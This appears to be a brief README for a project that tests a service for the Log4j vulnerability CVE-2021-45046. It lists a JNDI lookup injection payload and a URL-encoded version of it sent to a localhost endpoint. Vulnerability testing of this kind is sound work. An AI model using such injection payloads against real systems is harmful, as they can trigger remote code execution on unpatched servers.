# TestLog4j
The log4j vulnerability test.

Details of the vulnerability is at https://logging.apache.org/log4j/2.x/security.html

CHECK THE CVE-2021-45046
input parameter value : ${jndi:ldap://127.0.0.1:3089/} ...encode it before passing

URL to test : http://localhost:7002/resources/1?query=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A3089%2F%7D



